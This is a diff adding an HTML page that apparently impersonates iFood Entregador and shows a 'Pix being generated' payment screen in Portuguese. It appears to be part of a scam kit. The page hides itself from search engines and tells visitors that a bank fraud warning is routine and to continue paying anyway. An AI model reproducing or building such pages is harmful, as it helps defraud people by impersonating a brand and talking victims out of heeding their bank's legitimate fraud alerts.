@@ -1,0 +1,78 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iFood Entregador - Gerando PIX</title>
+    <meta name="description" content="Aguarde enquanto o Pix do seu pedido e preparado com seguranca.">
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css?v=11.1">
+</head>
+<body data-page="pix-loading">
+    <noscript class="no-js">Para continuar, ative o JavaScript no navegador.</noscript>
+
+    <main class="container">
+        <section class="step pix-loading-page" aria-hidden="false">
+            <div class="pix-loading-brand">
+                <img src="assets/ifoodentregadores.webp" alt="iFood Entregador">
+            </div>
+
+            <div class="pix-loading-card">
+                <div id="pix-loading-spinner" class="pix-loading-spinner" aria-hidden="true">
+                    <span class="pix-loading-spinner-ring"></span>
+                    <span class="pix-loading-spinner-check"></span>
+                </div>
+
+                <span id="pix-loading-kicker" class="pix-loading-kicker" aria-live="polite">Pix sendo gerado</span>
+                <h1>Confira o nome antes de pagar</h1>
+                <p class="pix-loading-copy">
+                    Seu banco pode mostrar um aviso de fraude ou seguranca antes do Pix. Isso e uma verificacao automatica. Confira o nome abaixo no aplicativo do banco e continue somente se o recebedor for o mesmo.
+                </p>
+
+                <div id="pix-loading-merchant-card" class="pix-loading-merchant">
+                    <span>O Pix deve aparecer neste nome</span>
+                    <strong id="pix-loading-merchant-name">-</strong>
+                </div>
+
+                <div id="pix-loading-merchant-fallback" class="pix-loading-warning hidden">
+                    <strong>Confira os dados no app do banco</strong>
+                    <span>Antes de concluir, veja se o recebedor e o valor estao corretos.</span>
+                </div>
+
+                <div class="pix-loading-security">
+                    <div>
+                        <strong>Se aparecer aviso de fraude</strong>
+                        <span>Nao se assuste. E uma camada extra do banco. Confira o nome do recebedor e o valor antes de seguir.</span>
+                    </div>
+                    <div>
+                        <strong>Quando estiver tudo certo</strong>
+                        <span>Toque no botao abaixo para abrir o Pix, copiar o codigo ou escanear o QR Code.</span>
+                    </div>
+                </div>
+
+                <div class="pix-loading-progress">
+                    <span id="pix-loading-status">Preparando seu Pix...</span>
+                    <div class="pix-loading-progress-track" aria-hidden="true">
+                        <i id="pix-loading-progress"></i>
+                    </div>
+                </div>
+
+                <button id="btn-pix-loading-continue" class="btn-primary pix-loading-btn" type="button">
+                    Continuar
+                </button>
+            </div>
+        </section>
+    </main>
+
+    <div id="toast" class="toast hidden" role="status" aria-live="polite"></div>
+
+    <footer class="footer">
+        <p>&copy; 2026 iFood Entregadores. Todos os direitos reservados.</p>
+    </footer>
+
+    <script src="script.js?v=11.1" defer=""></script>
+</body>
+</html>
